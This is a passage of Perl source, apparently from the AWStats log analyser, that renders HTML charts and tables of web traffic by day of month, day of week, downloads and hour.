		if ( ( $DayVisits{ $year . $month . $day } || 0 ) > $max_v ) {
			$max_v = $DayVisits{ $year . $month . $day };
		}

#if (($DayPages{$year.$month.$day}||0) > $max_p)  { $max_p=$DayPages{$year.$month.$day}; }
		if ( ( $DayHits{ $year . $month . $day } || 0 ) > $max_h ) {
			$max_h = $DayHits{ $year . $month . $day };
		}
		if ( ( $DayBytes{ $year . $month . $day } || 0 ) > $max_k ) {
			$max_k = $DayBytes{ $year . $month . $day };
		}
	}
    $average_v = sprintf( "%.2f", $AverageVisits );
    $average_p = sprintf( "%.2f", $AveragePages );
    $average_h = sprintf( "%.2f", $AverageHits );
    $average_k = sprintf( "%.2f", $AverageBytes );

	# Show bars for day
	my $graphdone=0;
	foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
	{
		my @blocklabel = ();
		foreach my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )
		{
			$daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
			my $year  = $1;
			my $month = $2;
			my $day   = $3;
			if ( !DateIsValid( $day, $month, $year ) ) {
				next;
			}    # If not an existing day, go to next
			my $bold =
			  (      $day == $nowday
				  && $month == $nowmonth
				  && $year == $nowyear ? ':' : '' );
			my $weekend =
			  ( DayOfWeek( $day, $month, $year ) =~ /[06]/ ? '!' : '' );
			push @blocklabel,
			  "$day\n$MonthNumLib{$month}$weekend$bold";
		}
		my @vallabel = (
			_t("Visits"), _t("Pages"),
			_t("Hits"), _t("Bandwidth")
		);
		my @valcolor =
		  ( "$color_v", "$color_p", "$color_h", "$color_k" );
		my @valmax   = ( $max_v,   $max_h,   $max_h,   $max_k );
		my @valtotal = ( $total_v, $total_p, $total_h, $total_k );
		my @valaverage =
		  ( $average_v, $average_p, $average_h, $average_k );
		my @valdata = ();
		my $xx      = 0;

		foreach my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )
		{
			$daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
			my $year  = $1;
			my $month = $2;
			my $day   = $3;
			if ( !DateIsValid( $day, $month, $year ) ) {
				next;
			}    # If not an existing day, go to next
			$valdata[ $xx++ ] = $DayVisits{ $year . $month . $day }
			  || 0;
			$valdata[ $xx++ ] = $DayPages{ $year . $month . $day } || 0;
			$valdata[ $xx++ ] = $DayHits{ $year . $month . $day }  || 0;
			$valdata[ $xx++ ] = $DayBytes{ $year . $month . $day } || 0;
		}
		my $function = "ShowGraph_$pluginname";
		&$function(
			"$title",              "daysofmonth",
			$ShowDaysOfMonthStats, \@blocklabel,
			\@vallabel,            \@valcolor,
			\@valmax,              \@valtotal,
			\@valaverage,          \@valdata
		);
		$graphdone=1;
	}
	# If graph was not printed by a plugin
	if (! $graphdone) {
		print "<table>\n";
		print "<tr valign=\"bottom\">\n";
		foreach my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )
		{
			$daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
			my $year  = $1;
			my $month = $2;
			my $day   = $3;
			if ( !DateIsValid( $day, $month, $year ) ) {
				next;
			}    # If not an existing day, go to next
			my $bredde_v = 0;
			my $bredde_p = 0;
			my $bredde_h = 0;
			my $bredde_k = 0;
			if ( $max_v > 0 ) {
				$bredde_v =
				  int( ( $DayVisits{ $year . $month . $day } || 0 ) /
					  $max_v * $BarHeight ) + 1;
			}
			if ( $max_h > 0 ) {
				$bredde_p =
				  int( ( $DayPages{ $year . $month . $day } || 0 ) /
					  $max_h * $BarHeight ) + 1;
			}
			if ( $max_h > 0 ) {
				$bredde_h =
				  int( ( $DayHits{ $year . $month . $day } || 0 ) /
					  $max_h * $BarHeight ) + 1;
			}
			if ( $max_k > 0 ) {
				$bredde_k =
				  int( ( $DayBytes{ $year . $month . $day } || 0 ) /
					  $max_k * $BarHeight ) + 1;
			}
			print "<td>";
			if ( $ShowDaysOfMonthStats =~ /V/i ) {
				print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vv'}\" height=\"$bredde_v\" width=\"4\""
				  . AltTitle( _t("Visits") . ": "
					  . int( $DayVisits{ $year . $month . $day } || 0 )
				  )
				  . " />";
			}
			if ( $ShowDaysOfMonthStats =~ /P/i ) {
				print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vp'}\" height=\"$bredde_p\" width=\"4\""
				  . AltTitle( _t("Pages") . ": "
					  . int( $DayPages{ $year . $month . $day } || 0 ) )
				  . " />";
			}
			if ( $ShowDaysOfMonthStats =~ /H/i ) {
				print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vh'}\" height=\"$bredde_h\" width=\"4\""
				  . AltTitle( _t("Hits") . ": "
					  . int( $DayHits{ $year . $month . $day } || 0 ) )
				  . " />";
			}
			if ( $ShowDaysOfMonthStats =~ /B/i ) {
				print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vk'}\" height=\"$bredde_k\" width=\"4\""
				  . AltTitle(
					_t("Bandwidth") . ": "
					  . Format_Bytes(
						$DayBytes{ $year . $month . $day }
					  )
				  )
				  . " />";
			}
			print "</td>\n";
		}
		print "<td>&nbsp;</td>";

		# Show average value bars
		print "<td>";
		my $bredde_v = 0;
		my $bredde_p = 0;
		my $bredde_h = 0;
		my $bredde_k = 0;
		if ( $max_v > 0 ) {
			$bredde_v = int( $average_v / $max_v * $BarHeight ) + 1;
		}
		if ( $max_h > 0 ) {
			$bredde_p = int( $average_p / $max_h * $BarHeight ) + 1;
		}
		if ( $max_h > 0 ) {
			$bredde_h = int( $average_h / $max_h * $BarHeight ) + 1;
		}
		if ( $max_k > 0 ) {
			$bredde_k = int( $average_k / $max_k * $BarHeight ) + 1;
		}
		$average_v = sprintf( "%.2f", $average_v );
		$average_p = sprintf( "%.2f", $average_p );
		$average_h = sprintf( "%.2f", $average_h );
		$average_k = sprintf( "%.2f", $average_k );
		if ( $ShowDaysOfMonthStats =~ /V/i ) {
			print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vv'}\" height=\"$bredde_v\" width=\"4\""
			  . AltTitle( _t("Visits") . ": $average_v") . " />";
		}
		if ( $ShowDaysOfMonthStats =~ /P/i ) {
			print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vp'}\" height=\"$bredde_p\" width=\"4\""
			  . AltTitle( _t("Pages") . ": $average_p") . " />";
		}
		if ( $ShowDaysOfMonthStats =~ /H/i ) {
			print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vh'}\" height=\"$bredde_h\" width=\"4\""
			  . AltTitle( _t("Hits") . ": $average_h") . " />";
		}
		if ( $ShowDaysOfMonthStats =~ /B/i ) {
			print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vk'}\" height=\"$bredde_k\" width=\"4\""
			  . AltTitle( _t("Bandwidth") . ": $average_k") . " />";
		}
		print "</td>\n";
		print "</tr>\n";

		# Show lib for day
		print "<tr valign=\"middle\">";
		foreach
		  my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )
		{
			$daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
			my $year  = $1;
			my $month = $2;
			my $day   = $3;
			if ( !DateIsValid( $day, $month, $year ) ) {
				next;
			}    # If not an existing day, go to next
			my $dayofweekcursor = DayOfWeek( $day, $month, $year );
			print "<td"
			  . (
				$dayofweekcursor =~ /[06]/
				? " bgcolor=\"#$color_weekend\""
				: ""
			  )
			  . ">";
			print(
				!$StaticLinks
				  && $day == $nowday
				  && $month == $nowmonth
				  && $year == $nowyear
				? '<span class="currentday">'
				: ''
			);
			print "$day<br /><span style=\"font-size: "
			  . (    $FrameName ne 'mainright'
				  && $QueryString !~ /buildpdf/i ? "9" : "8" )
			  . "px;\">"
			  . $MonthNumLib{$month}
			  . "</span>";
			print(   !$StaticLinks
				  && $day == $nowday
				  && $month == $nowmonth
				  && $year == $nowyear ? '</span>' : '' );
			print "</td>\n";
		}
		print "<td>&nbsp;</td>";
		print "<td valign=\"middle\""
		  . Tooltip(18)
		  . ">" . _t("Average") . "</td>\n";
		print "</tr>\n";
		print "</table>\n";
	}
	print "<br />\n";

	# Show data array for days
	if ($AddDataArrayShowDaysOfMonthStats) {
		print "<table>\n";
		print
"<tr><td width=\"80\" bgcolor=\"#$color_TableBGRowTitle\">" . _t("Day") . "</td>";
		if ( $ShowDaysOfMonthStats =~ /V/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_v\""
			  . Tooltip(1)
			  . ">" . _t("Visits") . "</td>";
		}
		if ( $ShowDaysOfMonthStats =~ /P/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_p\""
			  . Tooltip(3)
			  . ">" . _t("Pages") . "</td>";
		}
		if ( $ShowDaysOfMonthStats =~ /H/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_h\""
			  . Tooltip(4)
			  . ">" . _t("Hits") . "</td>";
		}
		if ( $ShowDaysOfMonthStats =~ /B/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_k\""
			  . Tooltip(5)
			  . ">" . _t("Bandwidth") . "</td>";
		}
		print "</tr>";
		foreach
		  my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )
		{
			$daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
			my $year  = $1;
			my $month = $2;
			my $day   = $3;
			if ( !DateIsValid( $day, $month, $year ) ) {
				next;
			}    # If not an existing day, go to next
			my $dayofweekcursor = DayOfWeek( $day, $month, $year );
			print "<tr"
			  . (
				$dayofweekcursor =~ /[06]/
				? " bgcolor=\"#$color_weekend\""
				: ""
			  )
			  . ">";
			print "<td>"
			  . (
				!$StaticLinks
				  && $day == $nowday
				  && $month == $nowmonth
				  && $year == $nowyear
				? '<span class="currentday">'
				: ''
			  );
			print Format_Date( "$year$month$day" . "000000", 2 );
			print(   !$StaticLinks
				  && $day == $nowday
				  && $month == $nowmonth
				  && $year == $nowyear ? '</span>' : '' );
			print "</td>";
			if ( $ShowDaysOfMonthStats =~ /V/i ) {
				print "<td>",
				  Format_Number($DayVisits{ $year . $month . $day }
				  ? $DayVisits{ $year . $month . $day }
				  : "0"), "</td>";
			}
			if ( $ShowDaysOfMonthStats =~ /P/i ) {
				print "<td>",
				  Format_Number($DayPages{ $year . $month . $day }
				  ? $DayPages{ $year . $month . $day }
				  : "0"), "</td>";
			}
			if ( $ShowDaysOfMonthStats =~ /H/i ) {
				print "<td>",
				  Format_Number($DayHits{ $year . $month . $day }
				  ? $DayHits{ $year . $month . $day }
				  : "0"), "</td>";
			}
			if ( $ShowDaysOfMonthStats =~ /B/i ) {
				print "<td>",
				  Format_Bytes(
					int( $DayBytes{ $year . $month . $day } || 0 ) ),
				  "</td>";
			}
			print "</tr>\n";
		}

		# Average row
		print
"<tr bgcolor=\"#$color_TableBGRowTitle\"><td>" . _t("Average") . "</td>";
		if ( $ShowDaysOfMonthStats =~ /V/i ) {
			print "<td>".Format_Number(int($average_v))."</td>";
		}
		if ( $ShowDaysOfMonthStats =~ /P/i ) {
			print "<td>".Format_Number(int($average_p))."</td>";
		}
		if ( $ShowDaysOfMonthStats =~ /H/i ) {
			print "<td>".Format_Number(int($average_h))."</td>";
		}
		if ( $ShowDaysOfMonthStats =~ /B/i ) {
			print "<td>".Format_Bytes(int($average_k))."</td>";
		}
		print "</tr>\n";

		# Total row
		print
"<tr bgcolor=\"#$color_TableBGRowTitle\"><td>" . _t("Total") . "</td>";
		if ( $ShowDaysOfMonthStats =~ /V/i ) {
			print "<td>".Format_Number($total_v)."</td>";
		}
		if ( $ShowDaysOfMonthStats =~ /P/i ) {
			print "<td>".Format_Number($total_p)."</td>";
		}
		if ( $ShowDaysOfMonthStats =~ /H/i ) {
			print "<td>".Format_Number($total_h)."</td>";
		}
		if ( $ShowDaysOfMonthStats =~ /B/i ) {
			print "<td>" . Format_Bytes($total_k) . "</td>";
		}
		print "</tr>\n";
		print "</table>\n<br />";
	}

	print "</center>\n";
	print "</td></tr>\n";
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Days of the Week section on the main page
# Parameters:   $firstdaytocountaverage, $lastdaytocountaverage
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainDaysofWeek{
	my $firstdaytocountaverage = shift;
	my $lastdaytocountaverage = shift;
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;	
    
	if ($Debug) { debug( "ShowDaysOfWeekStats", 2 ); }
			print "$Center<a name=\"daysofweek\">&nbsp;</a><br />\n";
			my $title = "📈 " . _t("Statistics by Day of Week");
			&tab_head( "$title", 18, 0, 'daysofweek' );
			print "<tr>";
			print "<td align=\"center\">";
			print "<center>\n";

			my $max_h = my $max_k = 0;    # Start from 0 because can be lower than 1
			                        # Get average value for day of week
			my @avg_dayofweek_nb = ();
			my @avg_dayofweek_p  = ();
			my @avg_dayofweek_h  = ();
			my @avg_dayofweek_k  = ();
			foreach my $daycursor (
				$firstdaytocountaverage .. $lastdaytocountaverage )
			{
				$daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
				my $year  = $1;
				my $month = $2;
				my $day   = $3;
				if ( !DateIsValid( $day, $month, $year ) ) {
					next;
				}    # If not an existing day, go to next
				my $dayofweekcursor = DayOfWeek( $day, $month, $year );
				$avg_dayofweek_nb[$dayofweekcursor]
				  ++; # Increase number of day used to count for this day of week
				$avg_dayofweek_p[$dayofweekcursor] +=
				  ( $DayPages{$daycursor} || 0 );
				$avg_dayofweek_h[$dayofweekcursor] +=
				  ( $DayHits{$daycursor} || 0 );
				$avg_dayofweek_k[$dayofweekcursor] +=
				  ( $DayBytes{$daycursor} || 0 );
			}
			for (@DOWIndex) {
				if ( $avg_dayofweek_nb[$_] ) {
					$avg_dayofweek_p[$_] =
					  $avg_dayofweek_p[$_] / $avg_dayofweek_nb[$_];
					$avg_dayofweek_h[$_] =
					  $avg_dayofweek_h[$_] / $avg_dayofweek_nb[$_];
					$avg_dayofweek_k[$_] =
					  $avg_dayofweek_k[$_] / $avg_dayofweek_nb[$_];

		  #if ($avg_dayofweek_p[$_] > $max_p) { $max_p = $avg_dayofweek_p[$_]; }
					if ( $avg_dayofweek_h[$_] > $max_h ) {
						$max_h = $avg_dayofweek_h[$_];
					}
					if ( $avg_dayofweek_k[$_] > $max_k ) {
						$max_k = $avg_dayofweek_k[$_];
					}
				}
				else {
					$avg_dayofweek_p[$_] = "?";
					$avg_dayofweek_h[$_] = "?";
					$avg_dayofweek_k[$_] = "?";
				}
			}

			# Show bars for days of week
			my $graphdone=0;
			foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
			{
				my @blocklabel = ();
				for (@DOWIndex) {
					my $dayname = _t("DayOfWeek_" . $_);
					push @blocklabel, $dayname . ( $_ =~ /[06]/ ? "!" : "" );
				}
				my @vallabel =
				  ( _t("Pages"), _t("Hits"), _t("Bandwidth") );
				my @valcolor = ( "$color_p", "$color_h", "$color_k" );
				my @valmax = ( int($max_h), int($max_h), int($max_k) );
				my @valtotal = ( $TotalPages, $TotalHits, $TotalBytes );
				# TEMP
				my $average_p = my $average_h = my $average_k = 0;
				$average_p = sprintf( "%.2f", $AveragePages );
				$average_h = sprintf( "%.2f", $AverageHits );
				$average_k = (
					int($average_k)
					? Format_Bytes( sprintf( "%.2f", $AverageBytes ) )
					: "0.00"
				);
				my @valaverage = ( $average_p, $average_h, $average_k );
				my @valdata    = ();
				my $xx         = 0;

				for (@DOWIndex) {
					$valdata[ $xx++ ] = $avg_dayofweek_p[$_] || 0;
					$valdata[ $xx++ ] = $avg_dayofweek_h[$_] || 0;
					$valdata[ $xx++ ] = $avg_dayofweek_k[$_] || 0;

					# Round to be ready to show array
					$avg_dayofweek_p[$_] =
					  sprintf( "%.2f", $avg_dayofweek_p[$_] );
					$avg_dayofweek_h[$_] =
					  sprintf( "%.2f", $avg_dayofweek_h[$_] );
					$avg_dayofweek_k[$_] =
					  sprintf( "%.2f", $avg_dayofweek_k[$_] );

					# Remove decimal part that are .0
					if ( $avg_dayofweek_p[$_] == int( $avg_dayofweek_p[$_] ) ) {
						$avg_dayofweek_p[$_] = int( $avg_dayofweek_p[$_] );
					}
					if ( $avg_dayofweek_h[$_] == int( $avg_dayofweek_h[$_] ) ) {
						$avg_dayofweek_h[$_] = int( $avg_dayofweek_h[$_] );
					}
				}
				my $function = "ShowGraph_$pluginname";
				&$function(
					"$title",             "daysofweek",
					$ShowDaysOfWeekStats, \@blocklabel,
					\@vallabel,           \@valcolor,
					\@valmax,             \@valtotal,
					\@valaverage,         \@valdata
				);
				$graphdone=1;
			}
			if (! $graphdone) 
			{
				print "<table>\n";
				print "<tr valign=\"bottom\">\n";
				for (@DOWIndex) {
					my $bredde_p = 0;
					my $bredde_h = 0;
					my $bredde_k = 0;
					if ( $max_h > 0 ) {
						$bredde_p = int(
							(
								  $avg_dayofweek_p[$_] ne '?'
								? $avg_dayofweek_p[$_]
								: 0
							) / $max_h * $BarHeight
						) + 1;
					}
					if ( $max_h > 0 ) {
						$bredde_h = int(
							(
								  $avg_dayofweek_h[$_] ne '?'
								? $avg_dayofweek_h[$_]
								: 0
							) / $max_h * $BarHeight
						) + 1;
					}
					if ( $max_k > 0 ) {
						$bredde_k = int(
							(
								  $avg_dayofweek_k[$_] ne '?'
								? $avg_dayofweek_k[$_]
								: 0
							) / $max_k * $BarHeight
						) + 1;
					}
					$avg_dayofweek_p[$_] = sprintf(
						"%.2f",
						(
							  $avg_dayofweek_p[$_] ne '?'
							? $avg_dayofweek_p[$_]
							: 0
						)
					);
					$avg_dayofweek_h[$_] = sprintf(
						"%.2f",
						(
							  $avg_dayofweek_h[$_] ne '?'
							? $avg_dayofweek_h[$_]
							: 0
						)
					);
					$avg_dayofweek_k[$_] = sprintf(
						"%.2f",
						(
							  $avg_dayofweek_k[$_] ne '?'
							? $avg_dayofweek_k[$_]
							: 0
						)
					);

					# Remove decimal part that are .0
					if ( $avg_dayofweek_p[$_] == int( $avg_dayofweek_p[$_] ) ) {
						$avg_dayofweek_p[$_] = int( $avg_dayofweek_p[$_] );
					}
					if ( $avg_dayofweek_h[$_] == int( $avg_dayofweek_h[$_] ) ) {
						$avg_dayofweek_h[$_] = int( $avg_dayofweek_h[$_] );
					}
					print "<td valign=\"bottom\">";
					if ( $ShowDaysOfWeekStats =~ /P/i ) {
						print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vp'}\" height=\"$bredde_p\" width=\"6\""
						  . AltTitle(_t("Pages") . ": $avg_dayofweek_p[$_]")
						  . " />";
					}
					if ( $ShowDaysOfWeekStats =~ /H/i ) {
						print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vh'}\" height=\"$bredde_h\" width=\"6\""
						  . AltTitle(_t("Hits") . ": $avg_dayofweek_h[$_]")
						  . " />";
					}
					if ( $ShowDaysOfWeekStats =~ /B/i ) {
						print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vk'}\" height=\"$bredde_k\" width=\"6\""
						  . AltTitle( _t("Bandwidth") . ": "
							  . Format_Bytes( $avg_dayofweek_k[$_] ) )
						  . " />";
					}
					print "</td>\n";
				}
				print "</tr>\n";
				print "<tr" . Tooltip(17) . ">\n";
				for (@DOWIndex) {
					my $dayname = _t("DayOfWeek_" . $_);
					print "<td"
					  . ( $_ =~ /[06]/ ? " bgcolor=\"#$color_weekend\"" : "" )
					  . ">"
					  . (
						!$StaticLinks
						  && $_ == ( $nowwday - 1 )
						  && $MonthRequired == $nowmonth
						  && $YearRequired == $nowyear
						? '<span class="currentday">'
						: ''
					  );
					print $dayname;
					print(   !$StaticLinks
						  && $_ == ( $nowwday - 1 )
						  && $MonthRequired == $nowmonth
						  && $YearRequired == $nowyear ? '</span>' : '' );
					print "</td>";
				}
				print "</tr>\n</table>\n";
			}
			print "<br />\n";

			# Show data array for days of week
			if ($AddDataArrayShowDaysOfWeekStats) {
				print "<table>\n";
				print
"<tr><td width=\"80\" bgcolor=\"#$color_TableBGRowTitle\">" . _t("Day") . "</td>";
				if ( $ShowDaysOfWeekStats =~ /P/i ) {
					print "<td width=\"80\" bgcolor=\"#$color_p\""
					  . Tooltip(3)
					  . ">" . _t("Pages") . "</td>";
				}
				if ( $ShowDaysOfWeekStats =~ /H/i ) {
					print "<td width=\"80\" bgcolor=\"#$color_h\""
					  . Tooltip(4)
					  . ">" . _t("Hits") . "</td>";
				}
				if ( $ShowDaysOfWeekStats =~ /B/i ) {
					print "<td width=\"80\" bgcolor=\"#$color_k\""
					  . Tooltip(5)
					  . ">" . _t("Bandwidth") . "</td></tr>";
				}
				for (@DOWIndex) {
					my $dayname = _t("DayOfWeek_" . $_);
					print "<tr"
					  . ( $_ =~ /[06]/ ? " bgcolor=\"#$color_weekend\"" : "" )
					  . ">";
					print "<td>"
					  . (
						!$StaticLinks
						  && $_ == ( $nowwday - 1 )
						  && $MonthRequired == $nowmonth
						  && $YearRequired == $nowyear
						? '<span class="currentday">'
						: ''
					  );
					print $dayname;
					print(   !$StaticLinks
						  && $_ == ( $nowwday - 1 )
						  && $MonthRequired == $nowmonth
						  && $YearRequired == $nowyear ? '</span>' : '' );
					print "</td>";
					if ( $ShowDaysOfWeekStats =~ /P/i ) {
						print "<td>", Format_Number(int($avg_dayofweek_p[$_])), "</td>";
					}
					if ( $ShowDaysOfWeekStats =~ /H/i ) {
						print "<td>", Format_Number(int($avg_dayofweek_h[$_])), "</td>";
					}
					if ( $ShowDaysOfWeekStats =~ /B/i ) {
						print "<td>", Format_Bytes(int($avg_dayofweek_k[$_])),
						  "</td>";
					}
					print "</tr>\n";
				}
				print "</table>\n<br />\n";
			}

			print "</center></td>";
			print "</tr>\n";
			&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Downloads chart and table
# Parameters:   -
# Input:        $NewLinkParams, $NewLinkTarget
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainDownloads{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	if (!$LevelForFileTypesDetection > 0){return;}
	if ($Debug) { debug( "ShowDownloadStats", 2 ); }
	my $regext         = qr/\.(\w{1,6})$/;
	print "$Center<a name=\"downloads\">&nbsp;</a><br />\n";
	my $Totalh = 0;
	if ($MaxNbOf{'DownloadsShown'} < 1){$MaxNbOf{'DownloadsShown'} = 10;}	# default if undefined
	my $title =
	  _t("Downloads") . " (" . _t("Top") . " $MaxNbOf{'DownloadsShown'}) &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'}
		  || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=downloads")
		: "$StaticLinks.downloads.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Full list") . "</a>";

    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
            $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
                "$AddLinkToExternalCGIWrapper" . "?section=DOWNLOADS&baseName=$DirData/$PROG"
            . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
            . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    }
	  
	&tab_head( "$title", 0, 0, 'downloads' );
	my $cnt=0;
	for my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){
		$Totalh += $_downloads{$u}->{'AWSTATS_HITS'};
		$cnt++;
		if ($cnt > 4){last;}
	}
	# Graph the top five in a pie chart
	if (($Totalh > 0) and (scalar keys %_downloads > 1)){
		foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
		{
			my @blocklabel = ();
			my @valdata = ();
			my @valcolor = ($color_p);
			my $cnt = 0;
			for my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){
				push @valdata, ($_downloads{$u}->{'AWSTATS_HITS'} / $Totalh * 1000 ) / 10;
				push @blocklabel, Get_Filename($u);
				$cnt++;
				if ($cnt > 4) { last; }
			}
			my $columns = 2;
			if ($ShowDownloadsStats =~ /H/i){$columns += length($ShowDownloadsStats)+1;}
			else{$columns += length($ShowDownloadsStats);}
			print "<tr><td colspan=\"$columns\">";
			my $function = "ShowGraph_$pluginname";
			&$function(
				_t("Full list"),       "downloads",
				0, 						\@blocklabel,
				0,           			\@valcolor,
				0,              		0,
				0,          			\@valdata
			);
			print "</td></tr>";
		}
	}
	
	my $total_dls = scalar keys %_downloads;
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"2\">" . _t("Downloads") . ": $total_dls</th>";
	if ( $ShowDownloadsStats =~ /H/i ){print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>"
		."<th bgcolor=\"#$color_h\" width=\"80\">206 " . _t("Hits") . "</th>"; }
	if ( $ShowDownloadsStats =~ /B/i ){
		print "<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>";
		print "<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Average") . "</th>"; 
	}
	print "</tr>\n";
	my $count   = 0;
	for my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){
		print "<tr>";
		my $ext = Get_Extension($regext, $u);
		if ( !$ext) {
			print "<td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/mime\/unknown.png\""
			  . AltTitle("")
			  . " /></td>";
		}
		else {
			my $nameicon = $MimeHashLib{$ext}[0] || "notavailable";
			my $nametype = $MimeHashFamily{$MimeHashLib{$ext}[0]} || "&nbsp;";
			print "<td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/mime\/$nameicon.png\""
			  . AltTitle("")
			  . " /></td>";
		}
		print "<td class=\"aws\">";
		&HTMLShowURLInfo($u);
		print "</td>";
		if ( $ShowDownloadsStats =~ /H/i ){
			print "<td>".Format_Number($_downloads{$u}->{'AWSTATS_HITS'})."</td>";
			print "<td>".Format_Number($_downloads{$u}->{'AWSTATS_206'})."</td>";
		}
		if ( $ShowDownloadsStats =~ /B/i ){
			print "<td>".Format_Bytes($_downloads{$u}->{'AWSTATS_SIZE'})."</td>";
			print "<td>".Format_Bytes(($_downloads{$u}->{'AWSTATS_SIZE'}/
					($_downloads{$u}->{'AWSTATS_HITS'} + $_downloads{$u}->{'AWSTATS_206'})))."</td>";
		}
		print "</tr>\n";
		$count++;
		if ($count >= $MaxNbOf{'DownloadsShown'}){last;}
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the hours chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainHours{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;
        
    if ($Debug) { debug( "ShowHoursStats", 2 ); }
	print "$Center<a name=\"hours\">&nbsp;</a><br />\n";
	my $title = "🕒 " . _t("Hourly Page Views");
	
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
       # extend the title to include the added link 
           $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
               "$AddLinkToExternalCGIWrapper" . "?section=TIME&baseName=$DirData/$PROG"
           . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
           . "&siteConfig=$SiteConfig" )
           . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    } 
	
	if ( $PluginsLoaded{'GetTimeZoneTitle'}{'timezone'} ) {
		$title .= " (GMT "
		  . ( GetTimeZoneTitle_timezone() >= 0 ? "+" : "" )
		  . int( GetTimeZoneTitle_timezone() ) . ")";
	}
	&tab_head( "$title", 19, 0, 'hours' );
	print "<tr><td align=\"center\">\n";
	print "<center>\n";

	my $max_h = my $max_k = 1;
	for ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {

		#if ($_time_p[$ix]>$max_p) { $max_p=$_time_p[$ix]; }
		if ( $_time_h[$ix] > $max_h ) { $max_h = $_time_h[$ix]; }
		if ( $_time_k[$ix] > $max_k ) { $max_k = $_time_k[$ix]; }
	}

	# Show bars for hour
	my $graphdone=0;
	foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
	{
		my @blocklabel = ( 0 .. 23 );
		my @vallabel   =
		  ( _t("Pages"), _t("Hits"), _t("Bandwidth") );
		my @valcolor = ( "$color_p", "$color_h", "$color_k" );
		my @valmax = ( int($max_h), int($max_h), int($max_k) );
		my @valtotal   = ( $TotalPages, $TotalHits, $TotalBytes );
		my @valaverage = ( $AveragePages, $AverageHits, $AverageBytes );
		my @valdata    = ();
		my $xx         = 0;
		for ( 0 .. 23 ) {
			$valdata[ $xx++ ] = $_time_p[$_] || 0;
			$valdata[ $xx++ ] = $_time_h[$_] || 0;
			$valdata[ $xx++ ] = $_time_k[$_] || 0;
		}
		my $function = "ShowGraph_$pluginname";
		&$function(
			"$title", "hours",
			$ShowHoursStats, \@blocklabel,
			\@vallabel, \@valcolor,
			\@valmax, \@valtotal,
			\@valaverage, \@valdata
		);
		$graphdone=1;
	}
	if (! $graphdone) 
	{
		print "<table>\n";
		print "<tr valign=\"bottom\">\n";
		for ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {
			my $bredde_p = 0;
			my $bredde_h = 0;
			my $bredde_k = 0;
			if ( $max_h > 0 ) {
				$bredde_p =
				  int( $BarHeight * $_time_p[$ix] / $max_h ) + 1;
			}
